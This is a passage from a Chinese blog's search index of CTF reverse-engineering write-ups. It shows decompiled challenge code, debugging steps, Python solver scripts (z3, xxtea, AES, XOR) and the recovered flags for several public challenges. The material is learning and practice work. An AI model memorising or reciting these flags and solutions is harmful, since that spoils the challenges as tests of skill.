{33a422c45d551ac6e4756f59812a954b}","tags":["reverse"],"categories":["wp"]},{"title":"MRCTF2020-PixelShooter","path":"/2022/07/03/MRCTF2020-PixelShooter/","content":"这是一道安卓逆向，而且是一个游戏题，可以用模拟器打开玩通关，不过一开始我还是习惯性地用 android killer 打开看 java 代码，一直找不到关键函数，然后突然想起之前做过类似的题目，这种游戏题一般是基于 unity 开发的，而且它的核心逻辑位于 assets\\bin\\Data\\Managed\\Assembly-CSharp.dll，所以我把它里面的 Assembly-CSharp.dll 文件提取出来之后，再用 dnSpy 打开，然后找到它的关键函数，但没想到的是 flag 直接就可以看到… 后面又在网上搜了一下这道题，发现还有一个工具也就是 JEB 可以来做这类题，然后我就下了一个试试 个人感觉 dnSpy 更好用哈哈哈哈 flag：MRCTF{Unity_1S_Fun_233}","tags":["reverse"],"categories":["wp"]},{"title":"GXYCTF2019-simpleCPP","path":"/2022/07/02/GXYCTF2019-simpleCPP/","content":"# 主函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196int __cdecl main(int argc, const char **argv, const char **envp)&#123; bool v3; // si __int64 *v4; // rax unsigned __int8 *v5; // rax unsigned __int8 *v6; // rbx int v7; // er10 __int64 v8; // r11 void **v9; // r9 void **v10; // r8 __int64 v11; // rdi __int64 v12; // r15 __int64 v13; // r12 __int64 v14; // rbp int v15; // ecx unsigned __int8 *v16; // rdx __int64 v17; // rdi __int64 *v18; // r14 __int64 v19; // rbp __int64 v20; // r13 __int64 *v21; // rdi __int64 v22; // r12 __int64 v23; // r15 __int64 v24; // rbp __int64 v25; // rdx __int64 v26; // rbp __int64 v27; // rbp __int64 v28; // r10 __int64 v29; // rdi __int64 v30; // r8 bool v31; // dl __int64 *v32; // rax void **v33; // rdx __int64 *v34; // rax __int64 *v35; // rax void *v36; // rcx __int64 v38; // [rsp+20h] [rbp-68h] void *Block[2]; // [rsp+30h] [rbp-58h] BYREF unsigned __int64 v40; // [rsp+40h] [rbp-48h] unsigned __int64 v41; // [rsp+48h] [rbp-40h] v3 = 0; v40 = 0i64; v41 = 15i64; LOBYTE(Block[0]) = 0; v4 = sub_7FF793A919C0(std::cout, &quot;I&#x27;m a first timer of Logic algebra , how about you?&quot;); std::ostream::operator&lt;&lt;(v4, sub_7FF793A91B90); sub_7FF793A919C0(std::cout, &quot;Let&#x27;s start our game,Please input your flag:&quot;); sub_7FF793A91DE0(std::cin, Block); std::ostream::operator&lt;&lt;(std::cout, sub_7FF793A91B90); if ( v40 - 5 &gt; 25 ) &#123; v35 = sub_7FF793A919C0(std::cout, &quot;Wrong input ,no GXY&#123;&#125; in input words&quot;); std::ostream::operator&lt;&lt;(v35, sub_7FF793A91B90); goto LABEL_43; &#125; v5 = operator new(32ui64); v6 = v5; if ( v5 ) &#123; *v5 = 0i64; *(v5 + 1) = 0i64; *(v5 + 2) = 0i64; *(v5 + 3) = 0i64; &#125; else &#123; v6 = 0i64; &#125; v7 = 0; if ( v40 ) &#123; v8 = 0i64; do &#123; v9 = Block; if ( v41 &gt;= 16 ) v9 = Block[0]; v10 = &amp;qword_7FF793A96048; if ( qword_7FF793A96060 &gt;= 16 ) v10 = qword_7FF793A96048; v6[v8] = *(v9 + v8) ^ *(v10 + v7 % 27); ++v7; ++v8; &#125; while ( v7 &lt; v40 ); &#125; v11 = 0i64; v12 = 0i64; v13 = 0i64; v14 = 0i64; if ( v40 &gt; 30 ) goto LABEL_27; v15 = 0; if ( v40 &lt;= 0 ) goto LABEL_27; v16 = v6; do &#123; v17 = *v16 + v11; ++v15; ++v16; switch ( v15 ) &#123; case 8: v14 = v17; goto LABEL_23; case 16: v13 = v17; goto LABEL_23; case 24: v12 = v17;LABEL_23: v17 = 0i64; break; case 32: sub_7FF793A919C0(std::cout, &quot;ERRO,out of range&quot;); exit(1); &#125; v11 = v17 &lt;&lt; 8; &#125; while ( v15 &lt; v40 ); if ( v14 ) &#123; v18 = operator new(0x20ui64); *v18 = v14; v18[1] = v13; v18[2] = v12; v18[3] = v11; goto LABEL_28; &#125;LABEL_27: v18 = 0i64;LABEL_28: v38 = v18[2]; v19 = v18[1]; v20 = *v18; v21 = operator new(0x20ui64); if ( IsDebuggerPresent() ) &#123; sub_7FF793A919C0(std::cout, &quot;Hi , DO not debug me !&quot;); Sleep(0x7D0u); exit(0); &#125; v22 = v19 &amp; v20; *v21 = v19 &amp; v20; v23 = v38 &amp; ~v20; v21[1] = v23; v24 = ~v19; v25 = v38 &amp; v24; v21[2] = v38 &amp; v24; v26 = v20 &amp; v24; v21[3] = v26; if ( v23 != 0x11204161012i64 ) &#123; v21[1] = 0i64; v23 = 0i64; &#125; v27 = v23 | v22 | v25 | v26; v28 = v18[1]; v29 = v18[2]; v30 = v25 &amp; *v18 | v29 &amp; (v22 | v28 &amp; ~*v18 | ~(v28 | *v18)); v31 = 0; if ( v30 == 0x8020717153E3013i64 ) v31 = v27 == 0x3E3A4717373E7F1Fi64; if ( (v27 ^ v18[3]) == 0x3E3A4717050F791Fi64 ) v3 = v31; if ( (v23 | v22 | v28 &amp; v29) == (~*v18 &amp; v29 | 0xC00020130082C0Ci64) &amp;&amp; v3 ) &#123; v32 = sub_7FF793A919C0(std::cout, &quot;Congratulations!flag is GXY&#123;&quot;); v33 = Block; if ( v41 &gt;= 0x10 ) v33 = Block[0]; v34 = sub_7FF793A91FD0(v32, v33, v40); sub_7FF793A919C0(v34, &quot;&#125;&quot;); j_j_free(v6); &#125; else &#123; sub_7FF793A919C0(std::cout, &quot;Wrong answer!try again&quot;); j_j_free(v6); &#125;LABEL_43: if ( v41 &gt;= 0x10 ) &#123; v36 = Block[0]; if ( v41 + 1 &gt;= 0x1000 ) &#123; v36 = *(Block[0] - 1); if ( (Block[0] - v36 - 8) &gt; 0x1F ) invalid_parameter_noinfo_noreturn(); &#125; j_j_free(v36); &#125; return 0;&#125; 通过 48-49 行可以知道，输入的 flag 就是 block，然后在 76 行，block 被复制给了 v9，又在 82 行和 v10 也就是 qword_7FF793A96048 进行了一次异或，qword_7FF793A96048 点进去发现是 0，觉得不对，然后右键它点击 jump to xref，可以发现是有对它赋值的 所以 qword_7FF793A96048 就是 “i_will_check_is_debug_or_not” 这个字符串，并且输入的 flag 会和它进行一次异或，所以我们现在要知道的就是这个计算的结果，然后逆运算得出 flag 了。我们继续往下看，发现 v6=v16，v16=v17，v17=v11，v11 又等于 v18 [3]，在 120 行 v11 = v17 &lt;&lt; 8，这里对 v17 进行了位移八位，进行了一个堆叠，所以 v6 就相当于整个 v18 串起来。 再往下看，168 行有一个 if 语句，条件通过就会通过程序，说明这就是最后的判断条件了，而且判断条件中涉及到了 v18 数组，再看看 145-167 行，这里全是一些赋值语句，最后赋的值也是写出来了的，这些最后全都可以用 v18 [0],v18 [1],v18 [2],v18 [3] 来表示，也就可以组成一个多元一次方程组，求解这个方程组可以用 python 的 z3 模块来求解，通过这样就可以得到 v18 的值了，这样就可以通过异或得到 flag，所以我们现在要做的就是理清这个方程组并解出来，脚本如下 1234567891011121314151617181920 from z3 import *x,y,z,w=BitVecs(&#x27;x y z w&#x27;,64)s=Solver()s.add((~x)&amp;z==1176889593874)s.add(((z&amp;~x)|(x&amp;y)|(z&amp;(~y))|(x&amp;(~y)))^w==4483974543195470111)s.add(((z&amp;~y)&amp;x|z&amp;((x&amp;y)|y&amp;~x|~(y|x)))==577031497978884115)s.add(((z&amp;~x)|(x&amp;y)|(z&amp;~y)|(x&amp;~y))==4483974544037412639)s.add(((z&amp;(~x)) | (x&amp;y) | y &amp; z) == (((~x)&amp; z)|864693332579200012))s.check()m = s.model()print(m)for i in m: print(&quot;%s = 0x%x&quot;%(i,m[i].as_long())) z3 模块如何使用可以参考这个博客：python z3 库学习_小龙在山东的博客 - CSDN 博客_python z3 库 结果如下： y = 0xc00020130082c0c x = 0x3e3a460533286f0d w = 0x32310600 z = 0x8020717153e3013 有了 v18 之后，我们就可以解 flag 了，脚本如下 123456789a = &quot;i_will_check_is_debug_or_not&quot;b =[0x3E,0x3A,0x46,0x05,0x33,0x28,0x6F,0x0D,0x8C,0x00,0x8A,0x09,0x78,0x49, 0x2C,0xAC,0x08,0x02,0x07,0x17,0x15,0x3E,0x30,0x13,0x32,0x31,0x06]c = &#x27;&#x27;for i in range(len(b)): c += chr(ord(a[i]) ^ b[i])print(c) 的出来的结果是 &quot;We1l_D0näeéb’ _ólgebra_am_i&quot;，这肯定是不对的，然后在网上看了别人的博客，说是这道题在比赛的时候给出来了中间的部分为 &quot;e!P0or_a&quot; 所以最后的 flag 为：flag{We1l_D0ne!P0or_algebra_am_i}","tags":["reverse"],"categories":["wp"]},{"title":"2019红帽杯xx","path":"/2022/07/01/2019红帽杯xx/","content":"这道题的前面一部分我分析不是很清楚，参考了其他大佬的博客才能理解 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173int __cdecl main(int argc, const char **argv, const char **envp)&#123; __int64 v3; // rbx __int64 v4; // rax __int128 *v5; // rax __int64 v6; // r11 __int128 *v7; // r14 int v8; // edi __int128 *v9; // rsi char v10; // r10 int v11; // edx __int64 v12; // r8 unsigned __int64 v13; // rcx __int64 v14; // rcx unsigned __int64 v15; // rax unsigned __int64 i; // rax __int64 v17; // rax size_t v18; // rsi _BYTE *v19; // rbx _BYTE *v20; // r9 int v21; // er11 char *v22; // r8 __int64 v23; // rcx char v24; // al __int64 v25; // r9 __int64 v26; // rdx __int64 v27; // rax size_t Size; // [rsp+20h] [rbp-48h] BYREF __int128 v30; // [rsp+28h] [rbp-40h] BYREF int v31; // [rsp+38h] [rbp-30h] int v32; // [rsp+3Ch] [rbp-2Ch] int Code[4]; // [rsp+40h] [rbp-28h] BYREF int v34; // [rsp+50h] [rbp-18h] *Code = 0i64; v34 = 0; sub_1400018C0(std::cin, argv, Code); v3 = -1i64; v4 = -1i64; do ++v4; while ( *(Code + v4) ); if ( v4 != 19 ) &#123; sub_140001620(std::cout, &quot;error &quot;); _exit(Code); &#125; v5 = operator new(5ui64); v6 = *&amp;::Code; v7 = v5; v8 = 0; v9 = v5; do &#123; v10 = *(v9 + Code - v5); v11 = 0; *v9 = v10; v12 = 0i64; v13 = -1i64; do ++v13; while ( *(v6 + v13) ); if ( v13 ) &#123; do &#123; if ( v10 == *(v6 + v12) ) break; ++v11; ++v12; &#125; while ( v11 &lt; v13 ); &#125; v14 = -1i64; do ++v14; while ( *(v6 + v14) ); if ( v11 == v14 ) _exit(v6); v9 = (v9 + 1); &#125; while ( v9 - v5 &lt; 4 ); *(v5 + 4) = 0; do ++v3; while ( *(Code + v3) ); v15 = 0i64; v30 = *v7; while ( *(&amp;v30 + v15) ) &#123; if ( !*(&amp;v30 + v15 + 1) ) &#123; ++v15; break; &#125; if ( !*(&amp;v30 + v15 + 2) ) &#123; v15 += 2i64; break; &#125; if ( !*(&amp;v30 + v15 + 3) ) &#123; v15 += 3i64; break; &#125; v15 += 4i64; if ( v15 &gt;= 16 ) break; &#125; for ( i = v15 + 1; i &lt; 0x10; ++i ) *(&amp;v30 + i) = 0; v17 = sub_140001AB0(Code, v3, &amp;v30, &amp;Size); v18 = Size; v19 = v17; v20 = operator new(Size); v21 = 1; *v20 = v19[2]; v22 = v20 + 1; v20[1] = *v19; v20[2] = v19[3]; v20[3] = v19[1]; v20[4] = v19[6]; v20[5] = v19[4]; v20[6] = v19[7]; v20[7] = v19[5]; v20[8] = v19[10]; v20[9] = v19[8]; v20[10] = v19[11]; v20[11] = v19[9]; v20[12] = v19[14]; v20[13] = v19[12]; v20[14] = v19[15]; v20[15] = v19[13]; v20[16] = v19[18]; v20[17] = v19[16]; v20[18] = v19[19]; v20[19] = v19[17]; v20[20] = v19[22]; v20[21] = v19[20]; v20[22] = v19[23]; for ( v20[23] = v19[21]; v21 &lt; v18; ++v22 ) &#123; v23 = 0i64; if ( v21 / 3 &gt; 0 ) &#123; v24 = *v22; do &#123; v24 ^= v20[v23++]; *v22 = v24; &#125; while ( v23 &lt; v21 / 3 ); &#125; ++v21; &#125; *&amp;v30 = 0xC0953A7C6B40BCCEui64; v25 = v20 - &amp;v30; *(&amp;v30 + 1) = 0x3502F79120209BEFi64; v26 = 0i64; v31 = 0xC8021823; v32 = 0xFA5656E7; do &#123; if ( *(&amp;v30 + v26) != *(&amp;v30 + v26 + v25) ) _exit(v8 * v8); ++v8; ++v26; &#125; while ( v26 &lt; 24 ); v27 = sub_140001620(std::cout, &quot;You win!&quot;); std::ostream::operator&lt;&lt;(v27, sub_1400017F0); return 0;&#125; 用 findcrypt 看了一下，sub_140001AB0 这个函数是 xxtea 加密，然后在加密之后，后面对加密后的 flag 乱了一下顺序，再每 3 个数据位一组，进行了一些异或操作 至于前面一部分的操作，大佬的博客是这样说的 判断输入的字符串的每个字符是否包含在 &quot;qwertyuiopasdfghjklzxcvbnm1234567890&quot; 中 取输入字符串的前 4 位字符，即 &quot;flag&quot;，扩展为 16 位，作为 xxtea 加密的秘钥 key 其中的 flag 扩展为 16 位，就只要在右端补 0 就可以了 由最后的 if 条件可知，v30，v30+1，v31，v32 就是最后的结果，这里要注意一下小端序的问题，要反过来写 1234567891011121314151617181920212223242526import xxtearesult = &#x27;CE BC 40 6B 7C 3A 95 C0 EF 9B 20 20 91 F7 02 35 23 18 02 C8 E7 56 56 FA&#x27;.split(&quot; &quot;)res = [int(i,16) for i in result]for i in range(7,-1,-1): t = 0 for n in range(0,i): if t == 0: t = res[0] else: t ^= res[n] for j in range(3): res[i*3+j] ^= tbox = [1,3,0,2,5,7,4,6,9,11,8,10,13,15,12,14,17,19,16,18,21,23,20,22]m = []for i in range(len(box)): m.append(res[box[i]])print(m)key = &#x27;flag&#x27;+&#x27;\\x00&#x27;*12print(xxtea.decrypt(bytes(m),key,padding=False)) 得到 flag：flag","tags":["reverse"],"categories":["wp"]},{"title":"nostringattached","path":"/2022/05/14/nostringattached/","content":"这是一个 32 为 ELF 文件，用 ida 打开之后，发现没有什么明显的字符串出现，那么看到主函数 12345678int __cdecl main(int argc, const char **argv, const char **envp)&#123; setlocale(6, &amp;locale); banner(); prompt_authentication(); authenticate(); return 0;&#125; 表面上没有什么值得注意的，经过检查后发现 authenticate 才是关键函数 # authenticate 函数 12345678910111213141516void authenticate()&#123; wchar_t ws[8192]; // [esp+1Ch] [ebp-800Ch] BYREF wchar_t *s2; // [esp+801Ch] [ebp-Ch] s2 = decrypt(&amp;s, &amp;dword_8048A90); if ( fgetws(ws, 8192, stdin) ) &#123; ws[wcslen(ws) - 1] = 0; if ( !wcscmp(ws, s2) ) wprintf(&amp;unk_8048B44); else wprintf(&amp;unk_8048BA4); &#125; free(s2);&#125; 其中 ws 是输入的 flag，输入的 flag 等于 s2 则输出 &amp; unk_8048B44 这个字符串，点开之后得知就是 Success，也就是正确，所以 s2 就是 flag，但是并不能直接找到，我们先看一下 authenticate 函数的汇编代码 12345678910111213141516171819202122232425262728293031.text:08048708 push ebp.text:08048709 mov ebp, esp.text:0804870B sub esp, 8028h.text:08048711 mov dword ptr [esp+4], offset dword_8048A90 ; wchar_t *.text:08048719 mov dword ptr [esp], offset s ; s.text:08048720 call decrypt.text:08048725 mov [ebp+s2], eax.text:08048728 mov eax, ds:stdin@@GLIBC_2_0.text:0804872D mov [esp+8], eax ; stream.text:08048731 mov dword ptr [esp+4], 2000h ; n.text:08048739 lea eax, [ebp+ws].text:0804873F mov [esp], eax ; ws.text:08048742 call _fgetws.text:08048747 test eax, eax.text:08048749 jz short loc_804879C.text:0804874B lea eax, [ebp+ws].text:08048751 mov [esp], eax ; s.text:08048754 call _wcslen.text:08048759 sub eax, 1.text:0804875C mov [ebp+eax*4+ws], 0.text:08048767 mov eax, [ebp+s2].text:0804876A mov [esp+4], eax ; s2.text:0804876E lea eax, [ebp+ws].text:08048774 mov [esp], eax ; s1.text:08048777 call _wcscmp.text:0804877C test eax, eax.text:0804877E jnz short loc_804878F.text:08048780 mov eax, offset unk_8048B44.text:08048785 mov [esp], eax.text:08048788 call _wprintf.text:0804878D jmp short loc_804879C 看到 6、7 行我们可以知道，我们的 s2 字符串在调用 decrypt 函数的时候杯传入了 eax 寄存器中，如果我们可以获取 eax 中的值就可以直接得到 flag 了，而这里我们需要用到 gdb 调试 # gdb 调试 首先用 gdb 打开文件 1gdb 1 (也可以加一个-q界面会更简洁) 然后在 decrypt 函数处设置断点 1b decrypt // (breakpoint) 再执行到断点处 1r // (run) 单步执行 decrypt 1n // (Step Over) 显示寄存器 1i r // (Info register) 最后就可以查看 eax 中的数据了 1x/6sw $eax 其中 6：显示六行数据 s：字符串形式 w：word（4 字节）形式 得到 flag：9447{you_are_an_international_mystery} 题目来源：攻防世界 (xctf.org.cn)——no-strings-attached","tags":["reverse"],"categories":["wp"]},{"title":"re3","path":"/2022/05/09/re3/","content":"这是一个 64 位 ELF 文件，在 Linux 中打开了一下没什么提示，随便输入几个字符提示 wrong，还是用 ida 打开它吧，打开之后直接看到主函数 其中有一个 for 循环进行了很多轮异或运算，而这个 sub_402219 函数正是参与运算的值，而且在后面它又作为函数单独出现，但是它又打不开，在汇编代码中可以找到这个函数的地址，发现这里有一大堆数据，所以我们需要把这一段数据给还原 我们选中 402219 的地址段，按 D 将其转化为数据，然后再通过 idc 脚本将其还原，脚本如下 然后选择数据之后按 C 分析数据，点击 force 强制执行，再将其转化为函数就可以了，这样之后我们的 sub_402219 函数就正常了，就可以正常打开了 在打开之前我们先用 findcrypt 看一下有哪些加密 有 md5 和 AES 两种加密，我们再看看 sub_402219 函数 # sub_402219 函数 12345678910111213141516171819__int64 __fastcall sub_402219(__int64 a1)&#123; unsigned int v2; // [rsp+18h] [rbp-D8h] int i; // [rsp+1Ch] [rbp-D4h] char v4[200]; // [rsp+20h] [rbp-D0h] BYREF unsigned __int64 v5; // [rsp+E8h] [rbp-8h] v5 = __readfsqword(0x28u); sub_400A71(v4, &amp;unk_603170); sub_40196E(v4, a1); sub_40196E(v4, a1 + 16); v2 = 1; for ( i = 0; i &lt;= 31; ++i ) &#123; if ( *(i + a1) != byte_6030A0[i] ) v2 = 0; &#125; return v2;&#125; 可以看到三个关键函数，第一个函数应用了刚刚在主函数中可以看到的 &amp; unk_603170 这一组数据，但我们不知道，可以在后面的调试中获取 在进行三轮加密之后，与 byte_6030A0 数组进行对比，byte_6030A0 数组的数据如下 12340xBC, 0x0A, 0xAD, 0xC0, 0x14, 0x7C, 0x5E, 0xCC, 0xE0, 0xB1, 0x40, 0xBC, 0x9C, 0x51, 0xD5, 0x2B, 0x46, 0xB2, 0xB9, 0x43, 0x4D, 0xE5, 0x32, 0x4B, 0xAD, 0x7F, 0xB4, 0xB3, 0x9C, 0xDB, 0x4B, 0x5B 而这段加密是 AES 加密（小声 bb：我还没有学），不过通过刚才的 findcrypt 可以分析出来这里是 AES 加密，第一个函数就是生成轮密钥，而且那个未知数组是初始密钥，第二个和第三个函数分别是对输入字符串的前后 16 位进行 AES 加密 # sub_40207B 函数 12345678910111213141516unsigned __int64 __fastcall sub_40207B(__int64 a1)&#123; char v2[16]; // [rsp+10h] [rbp-50h] BYREF __int64 v3; // [rsp+20h] [rbp-40h] BYREF __int64 v4; // [rsp+30h] [rbp-30h] BYREF __int64 v5; // [rsp+40h] [rbp-20h] BYREF unsigned __int64 v6; // [rsp+58h] [rbp-8h] v6 = __readfsqword(0x28u); sub_401CF9(&amp;BASE64_table_603120, 0x40uLL, v2); sub_401CF9(&amp;unk_603100, 0x14uLL, &amp;v3); sub_401CF9(&amp;Prime_Constants_char_6030C0, 0x35uLL, &amp;v4); sub_401CF9(MD5_Constants_4025C0, 0x100uLL, &amp;v5); sub_401CF9(v2, 0x40uLL, a1); return __readfsqword(0x28u) ^ v6;&#125; 在这个函数中，sub_401CF9 函数将 base64 表传入，并进行了加密 可以识别出这是 MD5 加密，在加密之后，被储存在 v2 中，之后又在 14 行进行了一次 MD5 加密后储存在 a1，也就是我们要找到的 &amp; unk_603170 数组中 # 总体思路 在第一个函数中将 base64 表进行了两次 MD5 加密，然后以其作为第二个函数中的 AES 加密的初始密钥，在进行 AES 加密，加密后的结果已经储存在 byte_6030A0 数组中且是可见的，而密钥是可以通过调试获取的，但因为这道题它是一个 ELF 文件，在 windows 是无法调试的，所以只能通过 Linux 进行远程调试，获取数据之后，用脚本进行 AES 解密就可以得到 flag # 远程调试 我用的 Linux 系统是 kali，第一次调试，先要把 linux_server 文件放到 kali 里面，然后再直接把文件放到 kali 的桌面上，然后复制一下它的文件位置，然后我们在桌面打开 kali 的终端，并且打开 Linux_server64 文件，之后回到 windows 的 ida 中，选择 debugger 为 remote Linux debugger，之后输入文件在 kali 中位置和虚拟机的 ip 即可开始调试了 这里有一个点要注意，就是我们如果在函数的开始部分就下断点，然后通过输入一个 32 长度的字符串的话，是无法绕过 if 的判断的，还是会退出程序，所以我们就在又在 if 判断的前后分别下一个断点，在运行到 if 之前的断点的时候再 ctrl+F7 跳过到下一个断点，通过这个方式来绕过，绕过之后再单步调试到 &amp; unk_603170 所在函数，然后再进入汇编代码段获取数据就可以获取到它的数据了 # 脚本 在知道了密钥之后和最终密文之后，就是通过脚本进行 AES 解密获取明文 flag 了，我还不会 AES 所以就参照了大佬的脚本，不过不知道为什么我运行不了这个脚本，不过有的别的脚本可以运行，这里我就把两个脚本都放在这吧 123456from Crypto.Cipher import AESimport codecsaes = AES.new(decode_hex(&#x27;CB8D493521B47A4CC1AE7E62229266CE&#x27;)[0], AES.MODE_ECB)print(aes.decrypt(decode_hex(&#x27;BC0AADC0147C5ECCE0B140BC9C51D52B46B2B9434DE5324BAD7FB4B39CDB4B5B&#x27;)[0])) 123456789from Crypto.Cipher import AESfrom binascii import b2a_hex, a2b_hexmode = AES.MODE_ECBkey = b&#x27;\\xcb\\x8d\\x49\\x35\\x21\\xb4\\x7a\\x4c\\xc1\\xae\\x7e\\x62\\x22\\x92\\x66\\xce&#x27;text = b&#x27;\\xBC\\x0A\\xAD\\xC0\\x14\\x7C\\x5E\\xCC\\xE0\\xB1\\x40\\xBC\\x9C\\x51\\xD5\\x2B\\x46\\xB2\\xB9\\x43\\x4D\\xE5\\x32\\x4B\\xAD\\x7F\\xB4\\xB3\\x9C\\xDB\\x4B\\x5B&#x27;cryptos = AES.new(key, mode)cipher_text = cryptos.decrypt(text)print(b2a_hex(cipher_text)) 注意一下第二个脚本得到的数据还要十六进制转 ASCII 一下 最后得到 flag {924a9ab2163d390410d0a1f670} 题目来源：BUUCTF 在线评测 (buuoj.cn)——re3","tags":["reverse"],"categories":["wp"]},{"title":"2019红帽杯easyRE","path":"/2022/05/07/2019红帽杯easyRE/","content":"这道题是个 elf 文件，在 Linux 环境中打开之后发现什么提示都没有，随便输入一串字符也没提示就直接退出了，于是就还是用 ida pro 打开，发现没有主函数的窗口，那就检索字符串吧，看到这么一大堆字符串 然后交叉引用一下进入到该字符串所在的函数，这应该就是关键函数了，发现这里有十个一样的函数 就发现这是 base64，而且进行了十次，进行十次之后的结果就是刚才那一大堆字符串，然后把它解码十次之后，就… 就得到了一个网站 https://bbs.pediy.com/thread-254172.htm，然后进去这个网站之后，根本就没有 flag 说明我们思路不对，所以我就返回去看主函数，看到这一部分 这里将三个字符串拼到一起，然后还在 v [12] 和 v [13] 的末端加了一个 127，然后再进行一次异或运算，写了个脚本得到了 Info:The first four chars are `flag`，这应该是一个提示，然后在这里呆了半天也不知道下一步该怎么做，看了大佬的题解提示，在进行完上面的异或和 base 循环之后，下面又调用了 sub_400D35 这个函数 我们看看这个函数 关键部分就是一个 if 条件语句和一个 for 循环了，if 的括号中的条件，是 v4 和一个已知数组的异或 1[0x40, 0x35, 0x20, 0x56, 0x5D, 0x18, 0x22, 0x45, 0x17, 0x2F, 0x24, 0x6E, 0x62, 0x3C, 0x27, 0x54, 0x48, 0x6C, 0x24, 0x6E, 0x72, 0x3C, 0x32, 0x45, 0x5B] 也容易看出前四位的异或结果应该就是 flag 了，然后在下面的 for 循环中再和 v4 进行异或，要知道 v4 我们就再进行一次异或就可以得到，然后就可以进行 for 循环中的异或了，异或之后的结果应该就是 flag 了，毕竟前四个结果就是 flag 嘛，脚本如下 123456789101112131415161718192021a = [73, 111, 100, 108, 62, 81, 110, 98, 40, 111, 99, 121, 127, 121, 46, 105, 127, 100, 96, 51, 119, 125, 119, 101, 107, 57, 123, 105, 121, 61, 126, 121, 76, 64, 69, 67]for i in range(len(a)): a[i] = chr(a[i] ^ i) print(a[i], end=&#x27;&#x27;)print()b = [0x40, 0x35, 0x20, 0x56, 0x5D, 0x18, 0x22, 0x45, 0x17, 0x2F, 0x24, 0x6E, 0x62, 0x3C, 0x27, 0x54, 0x48, 0x6C, 0x24, 0x6E, 0x72, 0x3C, 0x32, 0x45, 0x5B]c = &#x27;flag&#x27;v1 = &#x27;&#x27;flag = &#x27;&#x27;for i in range(len(c)): v1 += chr(b[i] ^ ord(c[i]))print(v1)for i in range(len(b)): flag += chr(b[i] ^ ord(v1[i % 4]))print(flag) 得到 flag {Act1ve_Defen5e_Test} 题目来源：BUUCTF 在线评测 (buuoj.cn)——[2019 红帽杯] easyRE","tags":["reverse"],"categories":["wp"]},{"title":"羊城杯2020easyre","path":"/2022/05/05/羊城杯2020easyre/","content":"# 主函数 思路很好理解，将输入的 flag 进行三次 encode 然后和 Str2 对比，一致则正确，我们分别看一下三个 encode 的作用 # encode_one 在 encode_one 中有一个 alphabet，其实就是编码表，很明显就是 base64 哈哈哈，所以这一个函数的作用就是给输入的 flag 进行一次 base64 编码 # encode_two 这一步是将 base64 编码后的 flag 进行一次分组，strncpy 函数的作用，以第一个为例，是将编码后的 flag 的 26 位开始数 13 个复制到 a3，也就是 26 到 39，以此类推就是 0-13，39-52，13-26 # encode_three 这一步是将分组完后的 flag 在进行一次算法加密，其实这就是凯撒加密，但比凯撒多了一步即 0-9 几个数字也进行了变化，48-57 就是 0-9 的 ASCII 码 # 总体思路 程序将我们输入的 flag 进行一次 base64 编码后，再 13 个 13 个为一组进行一次调换，然后在进行一次特殊的凯撒加密，最后在与 Str2 进行对比，Str2 就是进行了 3 次加密过后的结果，理清楚思路之后，我们反着来写个脚本就可以得到最初的 flag 了～ # 脚本 12345678910111213141516import base64a = &quot;EmBmP5Pmn7QcPU4gLYKv5QcMmB3PWHcP5YkPq3=cT6QckkPckoRG&quot;flag = &#x27;&#x27;for i in range(len(a)): if ord(a[i]) &gt; 47 and ord(a[i]) &lt;= 57: flag += chr((ord(a[i]) - 48 - 3) % 10 + 48) # 数字也要减三 elif ord(a[i]) &gt; 96 and ord(a[i]) &lt;= 122: flag += chr((ord(a[i]) - 97 - 3) % 26 + 97) elif ord(a[i]) &gt; 64 and ord(a[i]) &lt;= 90: flag += chr((ord(a[i]) - 65 - 3) % 26 + 65) else: flag += a[i]print(flag)flag = flag[13:26] + flag[39:] + flag[:13] + flag[26:39]print(base64.b64decode(flag)) 得到 flag：GWHT{672cc4778a38e80cb362987341133ea2} 题目来源：BUUCTF 在线评测 (buuoj.cn)——[羊城杯 2020] easyre","tags":["reverse"],"categories":["wp"]},{"title":"findkey","path":"/2022/05/01/findkey/","content":"这是一个 32 位的程序，点开之后啥都没有，就是一个空的界面 然后用 idapro 打开它之后，发现主函数中也没有什么有用的东西 所以我就 shift+F12 查看一下字符串，发现有几个可以字符串 双击进去交叉引用一下，可以看到 但是这里无法 F5 查看伪代码，所以我们把红色的全部选中并将它转为函数即可，转为函数后我们就可以来分析了 # main 函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118LRESULT __stdcall sub_401640(HWND hWndParent, UINT Msg, WPARAM wParam, LPARAM lParam)&#123; int v5; // eax size_t v6; // eax DWORD v7; // eax int v8; // eax int v9; // eax int v10; // [esp+4Ch] [ebp-400h] UINT v11; // [esp+50h] [ebp-3FCh] CHAR v12[256]; // [esp+54h] [ebp-3F8h] BYREF char v13[7]; // [esp+154h] [ebp-2F8h] BYREF __int16 v14; // [esp+15Bh] [ebp-2F1h] char v15; // [esp+15Dh] [ebp-2EFh] char Str[33]; // [esp+160h] [ebp-2ECh] BYREF char v17[220]; // [esp+181h] [ebp-2CBh] BYREF __int16 v18; // [esp+25Dh] [ebp-1EFh] char v19; // [esp+25Fh] [ebp-1EDh] CHAR v20[256]; // [esp+260h] [ebp-1ECh] BYREF CHAR String[4]; // [esp+360h] [ebp-ECh] BYREF int v22; // [esp+364h] [ebp-E8h] __int16 v23; // [esp+368h] [ebp-E4h] CHAR Text[32]; // [esp+36Ch] [ebp-E0h] BYREF struct tagRECT Rect; // [esp+38Ch] [ebp-C0h] BYREF CHAR Buffer[100]; // [esp+39Ch] [ebp-B0h] BYREF HDC hdc; // [esp+400h] [ebp-4Ch] struct tagPAINTSTRUCT Paint; // [esp+404h] [ebp-48h] BYREF int v29; // [esp+444h] [ebp-8h] int v30; // [esp+448h] [ebp-4h] LoadStringA(hInstance, 0x6Au, Buffer, 100); v11 = Msg; if ( Msg &gt; 0x111 ) &#123; if ( v11 == 517 ) &#123; if ( strlen((const char *)String1) &gt; 6 ) ExitProcess(0); if ( strlen((const char *)String1) ) &#123; memset(v20, 0, sizeof(v20)); v6 = strlen((const char *)String1); memcpy(v20, String1, v6); v7 = 